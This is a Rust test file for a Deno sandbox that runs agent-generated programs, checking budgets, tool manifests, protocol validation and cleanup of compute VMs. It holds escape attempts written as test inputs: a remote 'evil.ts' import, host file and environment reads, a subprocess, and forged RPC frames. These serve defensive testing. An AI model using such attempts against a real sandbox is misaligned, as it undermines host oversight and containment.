//! Real Deno boundary tests: host budgets, capabilities and protocol validation.
use augmentagent_channel_core::code_mode::runner::{run_program_with_options, RunOptions};
use augmentagent_channel_core::code_mode::{StubDispatcher, ToolManifest};
use serde_json::json;
use std::collections::BTreeMap;
use std::time::Duration;

#[tokio::test]
async fn compute_host_deadline_prevents_late_success() {
    let opts = RunOptions {
        timeout: Duration::from_millis(25),
        ..Default::default()
    };
    let result = run_program_with_options(
        "async function main() { await new Promise(r => setTimeout(r, 250)); return 'late'; } main();",
        &ToolManifest::default(), &StubDispatcher::always_null(&[]), &opts).await;
    assert!(result.is_err(), "host budget ignored: {result:?}");
}

#[tokio::test]
async fn compute_host_input_bindings_reach_real_program() {
    let opts = RunOptions {
        compute_inputs: BTreeMap::from([("sheet".into(), "opaque-id".into())]),
        ..Default::default()
    };
    let result = run_program_with_options(
        "async function main() { return computeInputs.sheet; } main();",
        &ToolManifest::default(),
        &StubDispatcher::always_null(&[]),
        &opts,
    )
    .await
    .unwrap();
    assert_eq!(result.final_value, json!("opaque-id"));
}

#[tokio::test]
async fn invalid_program_budgets_are_rejected_before_execution() {
    for timeout in [Duration::ZERO, Duration::from_secs(3601)] {
        let result = run_program_with_options(
            "async function main() { return 1; } main();",
            &ToolManifest::default(),
            &StubDispatcher::always_null(&[]),
            &RunOptions {
                timeout,
                ..Default::default()
            },
        )
        .await;
        assert!(result.is_err(), "accepted invalid budget {timeout:?}");
    }
}

#[tokio::test]
async fn forged_rpc_cannot_bypass_host_manifest() {
    // The generated program shares stdio with the sidecar. The host must check
    // its manifest independently, even if the JS proxy is bypassed entirely.
    let result = run_program_with_options(r#"
        async function main() {
            Deno.stdout.writeSync(new TextEncoder().encode(JSON.stringify({id:77,call:'secret',args:[]})+'\n'));
            await new Promise(r => setTimeout(r, 50));
            return 'done';
        } main();
    "#, &ToolManifest::default(), &StubDispatcher::new(vec![("secret".into(), json!("forbidden"))]),
        &RunOptions::default()).await;
    match result {
        Ok(outcome) => assert!(outcome.trace.is_empty(), "host dispatched an unlisted tool"),
        Err(_) => (), // A protocol refusal before dispatch is also safe.
    }
}

#[tokio::test]
async fn fake_terminal_frame_cannot_disable_host_watchdog() {
    let opts = RunOptions {
        timeout: Duration::from_millis(40),
        ..Default::default()
    };
    let manifest = ToolManifest::default();
    let dispatcher = StubDispatcher::always_null(&[]);
    let future = run_program_with_options(
        r#"
        async function main() {
            Deno.stdout.writeSync(new TextEncoder().encode('{"final":"forged"}\n'));
            while (true) {}
        } main();
    "#,
        &manifest,
        &dispatcher,
        &opts,
    );
    let result = tokio::time::timeout(Duration::from_millis(500), future).await;
    assert!(result.is_ok(), "final frame bypassed the host deadline");
    assert!(
        result.unwrap().is_err(),
        "accepted a final frame without process exit"
    );
}

#[tokio::test]
async fn orchestration_cannot_import_host_or_remote_modules() {
    use std::io::Write;
    let mut secret = tempfile::NamedTempFile::new().unwrap();
    writeln!(secret, "export const marker = 'SYNTHETIC_HOST_CANARY';").unwrap();
    let local = format!("file://{}", secret.path().display());
    let attempts = [
        format!(
            "import({}).then(m => m.marker)",
            serde_json::to_string(&local).unwrap()
        ),
        "import('https://example.invalid/evil.ts')".into(),
        "import('npm:is-number@7.0.0')".into(),
        format!(
            "Deno.readTextFile({})",
            serde_json::to_string(secret.path()).unwrap()
        ),
        "Deno.env.get('HOME')".into(),
        "new Deno.Command('/bin/true').output()".into(),
        "fetch('http://127.0.0.1:1')".into(),
    ];
    for attempt in attempts {
        let program = format!("async function main() {{ try {{ await {attempt}; return false; }} catch (_) {{ return true; }} }} main();");
        let result = run_program_with_options(
            &program,
            &ToolManifest::default(),
            &StubDispatcher::always_null(&[]),
            &RunOptions::default(),
        )
        .await;
        // Remote literal imports may be rejected before main is evaluated.
        // Test each attempt independently so one loader refusal cannot hide
        // a successful filesystem/environment/subprocess escape.
        if let Ok(outcome) = result {
            assert_eq!(outcome.final_value, json!(true), "allowed {attempt}");
        }
    }
}

fn service_config(
    root: &std::path::Path,
    enabled: bool,
) -> augmentagent_channel_core::code_mode::compute::ServiceConfig {
    use augmentagent_channel_core::code_mode::compute::{ComputePolicy, ServiceConfig};
    let artifacts = root.join("artifacts");
    std::fs::create_dir(&artifacts).unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&artifacts, std::fs::Permissions::from_mode(0o700)).unwrap();
    }
    ServiceConfig {
        policy: ComputePolicy {
            enabled,
            call_timeout: Duration::from_secs(30),
            task_timeout: Duration::from_secs(60),
        },
        runtime: root.join("missing-runtime.json"),
        scratch_root: root.join("scratch"),
        pip_runtime: None,
        artifact_root: artifacts,
        input_files: BTreeMap::new(),
    }
}

#[tokio::test]
async fn disabled_service_returns_structured_denial_and_verified_close() {
    use augmentagent_channel_core::code_mode::compute::ComputeService;
    let root = tempfile::tempdir().unwrap();
    let service = ComputeService::start(service_config(root.path(), false))
        .await
        .expect("private helper starts even without a VM when disabled");
    let result = service
        .execute(json!({"runtime":"python","dependencies":[],"code":"print(1)"}))
        .await
        .unwrap();
    assert_eq!(result["error"]["code"], "compute_disabled");
    assert_eq!(result["runner"], "none");
    let finished = service.finish().await.unwrap();
    assert_eq!(finished["cleanupVerified"], true);
}

#[tokio::test]
async fn service_imports_selected_files_as_opaque_ids() {
    use augmentagent_channel_core::code_mode::compute::ComputeService;
    let root = tempfile::tempdir().unwrap();
    let source = root.path().join("selected.csv");
    std::fs::write(&source, "a,b\n1,2\n").unwrap();
    let mut config = service_config(root.path(), false);
    config
        .input_files
        .insert("sheet.csv".into(), source.clone());
    let service = ComputeService::start(config).await.unwrap();
    let ids = service.inputs();
    assert_eq!(ids.len(), 1);
    assert_eq!(ids["sheet.csv"].len(), 32);
    assert_ne!(ids["sheet.csv"], source.to_string_lossy());
    service.finish().await.unwrap();
}

#[tokio::test]
async fn real_dispatcher_preserves_denial_and_redacts_compute_trace() {
    use augmentagent_channel_core::code_mode::{
        compute::{ComputeDispatcher, ComputeService},
        manifest::manifest_compute,
        Dispatcher,
    };
    let root = tempfile::tempdir().unwrap();
    let service = ComputeService::start(service_config(root.path(), false))
        .await
        .unwrap();
    let dispatcher = ComputeDispatcher::new(service.clone());
    let outcome = run_program_with_options(
        "async function main() { return await tools.compute.run({runtime:'python',dependencies:[],code:'SOURCE_CANARY'}); } main();",
        &manifest_compute(), &dispatcher, &service.run_options().unwrap()).await.unwrap();
    assert_eq!(outcome.final_value["error"]["code"], "compute_disabled");
    assert!(!serde_json::to_string(&outcome.trace)
        .unwrap()
        .contains("SOURCE_CANARY"));
    assert_eq!(outcome.trace.len(), 1);
    assert!(dispatcher.call("draft", json!([])).await.is_err());
    assert!(dispatcher
        .call("compute.run", json!([{}, {}]))
        .await
        .is_err());
    service.finish().await.unwrap();
}

#[tokio::test]
#[ignore = "requires JARVIS_TEST_VM_CONFIG and an isolated JARVIS_TEST_COMPUTE_SCRATCH; run explicitly in VM acceptance QA"]
async fn real_deno_rust_vm_artifact_round_trip() {
    use augmentagent_channel_core::code_mode::{
        compute::{ComputeDispatcher, ComputeService},
        manifest::manifest_compute,
    };
    let root = tempfile::tempdir().unwrap();
    let mut config = service_config(root.path(), true);
    config.runtime = std::env::var_os("JARVIS_TEST_VM_CONFIG")
        .expect("VM config required")
        .into();
    config.scratch_root = std::env::var_os("JARVIS_TEST_COMPUTE_SCRATCH")
        .expect("isolated scratch required")
        .into();
    let source = root.path().join("selected.txt");
    std::fs::write(&source, "10\n20\n30\n").unwrap();
    config.input_files.insert("numbers".into(), source);
    let service = ComputeService::start(config).await.unwrap();
    let dispatcher = ComputeDispatcher::new(service.clone());
    let program = r#"async function main() {
        const first = await tools.compute.run({runtime:'python',dependencies:[],
            inputs:[{artifactId:computeInputs.numbers,name:'numbers.txt'}], outputs:['total.json'],
            code:"import json\nnumbers=[int(x) for x in open('/inputs/numbers.txt')]\nopen('/outputs/total.json','w').write(json.dumps({'count':len(numbers),'total':sum(numbers)}))"});
        if (!first.ok) throw new Error(JSON.stringify(first.error));
        const second = await tools.compute.run({runtime:'python',dependencies:[],
            inputs:[{artifactId:first.artifacts[0].id,name:'total.json'}],
            code:"print(open('/inputs/total.json').read())"});
        if (!second.ok) throw new Error(JSON.stringify(second.error));
        return {runner:second.runner, value:JSON.parse(second.stdout)};
    } main();"#;
    let outcome = run_program_with_options(
        program,
        &manifest_compute(),
        &dispatcher,
        &service.run_options().unwrap(),
    )
    .await;
    let finished = service.finish().await.expect("verified VM cleanup");
    assert_eq!(finished["cleanupVerified"], true);
    let outcome = outcome.unwrap();
    assert_eq!(
        outcome.final_value,
        json!({"runner":"vm","value":{"count":3,"total":60}})
    );
    assert_eq!(outcome.trace.len(), 2);
}

#[tokio::test]
#[ignore = "requires real isolated VM configuration; run explicitly in VM lifecycle QA"]
async fn dropped_compute_future_cancels_vm_and_verifies_cleanup() {
    use augmentagent_channel_core::code_mode::compute::ComputeService;
    let root = tempfile::tempdir().unwrap();
    let mut config = service_config(root.path(), true);
    config.runtime = std::env::var_os("JARVIS_TEST_VM_CONFIG")
        .expect("VM config required")
        .into();
    config.scratch_root = std::env::var_os("JARVIS_TEST_COMPUTE_SCRATCH")
        .expect("isolated scratch required")
        .into();
    let service = ComputeService::start(config).await.unwrap();
    let result = tokio::time::timeout(
        Duration::from_secs(3),
        service.execute(json!({
            "runtime":"python", "dependencies":[], "code":"import time\ntime.sleep(25)"
        })),
    )
    .await;
    assert!(
        result.is_err(),
        "workload should still be executing when canceled"
    );
    let receipt = tokio::time::timeout(Duration::from_secs(5), service.finish())
        .await
        .expect("cleanup must finish within five seconds")
        .expect("verified cleanup");
    assert_eq!(receipt["cancelled"], true);
    assert_eq!(receipt["cleanupVerified"], true);
    assert!(service.execute(json!({})).await.is_err());
}
